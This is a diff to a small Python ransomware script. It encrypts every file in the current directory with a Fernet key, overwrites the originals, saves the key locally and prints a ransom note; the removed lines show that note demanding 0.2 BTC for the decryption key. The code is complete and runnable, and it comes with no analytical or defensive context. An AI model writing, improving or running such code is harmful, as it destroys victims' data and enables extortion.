@@ -1,36 +1,36 @@
 import os
 from cryptography.fernet import Fernet
+from text import hacked
 
-files = []
+def get_files():
+    exclude_files = ["encrypt.py", "thekey.key", "decrypt.py", "text.py"]
+    files = [file for file in os.listdir() if file not in exclude_files and os.path.isfile(file)]
+    return files
 
-# adding all files in the current directory to an array to encrypt
-for file in os.listdir():
-	# add the files to encrypt except these files
-	if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
-		continue
-	# only add files and not directories
-	if os.path.isfile(file):
-		files.append(file)
-print(files)
+def generate_key():
+    key = Fernet.generate_key()
+    with open("thekey.key", "wb") as thekey:
+        thekey.write(key)
 
-key = Fernet.generate_key()
+    return key
 
-with open("thekey.key", "wb") as thekey:
-	thekey.write(key)
+def encrypt_files(files, key):
+    for file in files:
+        with open(file, "rb") as thefile:
+            content = thefile.read()
+        encrypted_content = Fernet(key).encrypt(content)
+        with open(file, "wb") as thefile:
+            thefile.write(encrypted_content)
 
-for file in files:
-	with open(file, "rb") as thefile:
-		content = thefile.read()
-	content_encrypted = Fernet(key).encrypt(content)
-	with open(file, "wb") as thefile:
-		thefile.write(content_encrypted)
+def main():
+    try:
+        files = get_files()
+        key = generate_key()
+        encrypt_files(files, key)
+        print(hacked)
 
-print(""" ________________________________________________________
-|							 |
-|							 |
-|	You have been hacked and all of your Files	 |
-|	have been encrypted. Send me 0.2 BTC to get	 |
-|		the Key to decrypt them.		 |
-|							 |
-|________________________________________________________|
-""")
+    except Exception as e:
+        print(f"A problem occured: {e}.")
+
+if __name__ == "__main__":
+    main()
